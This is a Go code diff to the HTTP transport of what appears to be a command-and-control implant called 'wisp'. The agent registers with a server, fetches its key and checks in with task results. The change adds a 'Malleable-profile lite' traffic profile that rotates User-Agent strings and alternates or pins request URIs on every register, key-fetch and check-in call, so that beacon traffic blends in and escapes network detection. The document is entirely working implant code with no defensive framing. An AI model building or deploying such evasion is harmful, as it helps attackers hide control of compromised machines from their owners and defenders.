@@ -13,6 +13,7 @@ import (
 	"net/http"
 	"time"
 
+	"github.com/user/wisp/agent/config"
 	"github.com/user/wisp/shared/protocol"
 )
 
@@ -30,16 +31,69 @@ type HTTPTransport struct {
 	// Fingerprint optionally pins the server TLS certificate (hex SHA-256).
 	Fingerprint string
 
+	// TrafficProfile drives per-request UA rotation / URI alternation
+	// (Malleable-profile lite).
+	TrafficProfile *config.TrafficProfile
+
 	client *http.Client
 	base   string
 
 	seq uint64 // monotonic checkin counter (replay protection)
+	ua  uint64 // UA rotation index
+	uri uint64 // URI rotation index
+}
+
+// SetTrafficProfile configures UA rotation / URI alternation on the transport.
+func (t *HTTPTransport) SetTrafficProfile(p *config.TrafficProfile) {
+	t.TrafficProfile = p
+}
+
+// pickURI rotates across the profile's URIs. When none are set, falls back to
+// the fixed path. `shift` advances the rotation so consecutive requests use
+// different URIs when a profile lists several.
+func (t *HTTPTransport) pickURI(fixed string, shift uint64) string {
+	if t.TrafficProfile == nil {
+		return t.base + fixed
+	}
+	// Pinned per-endpoint URI (from the listener's Malleable profile) wins.
+	var pinned string
+	switch {
+	case fixed == "/api/v1/register":
+		pinned = t.TrafficProfile.RegisterURI
+	case fixed == "/api/v1/checkin":
+		pinned = t.TrafficProfile.CheckinURI
+	case fixed == "/api/v1/pubkey":
+		pinned = t.TrafficProfile.PubKeyURI
+	}
+	if pinned != "" {
+		return t.base + pinned
+	}
+	if len(t.TrafficProfile.URIs) == 0 {
+		return t.base + fixed
+	}
+	idx := (t.uri + shift) % uint64(len(t.TrafficProfile.URIs))
+	t.uri = (t.uri + 1) % uint64(len(t.TrafficProfile.URIs))
+	return t.base + t.TrafficProfile.URIs[idx]
+}
+
+// applyProfile sets the rotating User-Agent header (if any) on a request.
+func (t *HTTPTransport) applyProfile(req *http.Request) {
+	if t.TrafficProfile != nil && len(t.TrafficProfile.UserAgents) > 0 {
+		ua := t.TrafficProfile.UserAgents[t.ua%uint64(len(t.TrafficProfile.UserAgents))]
+		t.ua++
+		req.Header.Set("User-Agent", ua)
+	}
 }
 
 // fetchServerKey retrieves the RSA public key from the server's /pubkey
 // endpoint. Used when the binary has no compiled-in key (CLI/dev mode).
 func (t *HTTPTransport) fetchServerKey() error {
-	resp, err := t.client.Get(t.base + "/api/v1/pubkey")
+	req, err := http.NewRequest(http.MethodGet, t.pickURI("/api/v1/pubkey", 0), nil)
+	if err != nil {
+		return err
+	}
+	t.applyProfile(req)
+	resp, err := t.client.Do(req)
 	if err != nil {
 		return err
 	}
@@ -146,7 +200,13 @@ func (t *HTTPTransport) Register(regData []byte) error {
 		return err
 	}
 
-	resp, err := t.client.Post(t.base+"/api/v1/register", "application/json", bytes.NewReader(body))
+	httpreq, err := http.NewRequest(http.MethodPost, t.pickURI("/api/v1/register", 0), bytes.NewReader(body))
+	if err != nil {
+		return err
+	}
+	httpreq.Header.Set("Content-Type", "application/json")
+	t.applyProfile(httpreq)
+	resp, err := t.client.Do(httpreq)
 	if err != nil {
 		return fmt.Errorf("register request: %w", err)
 	}
@@ -193,7 +253,13 @@ func (t *HTTPTransport) Checkin(results []byte) ([]byte, error) {
 		return nil, err
 	}
 
-	resp, err := t.client.Post(t.base+"/api/v1/checkin", "application/json", bytes.NewReader(body))
+	httpreq, err := http.NewRequest(http.MethodPost, t.pickURI("/api/v1/checkin", t.seq), bytes.NewReader(body))
+	if err != nil {
+		return nil, err
+	}
+	httpreq.Header.Set("Content-Type", "application/json")
+	t.applyProfile(httpreq)
+	resp, err := t.client.Do(httpreq)
 	if err != nil {
 		return nil, fmt.Errorf("checkin request: %w", err)
 	}
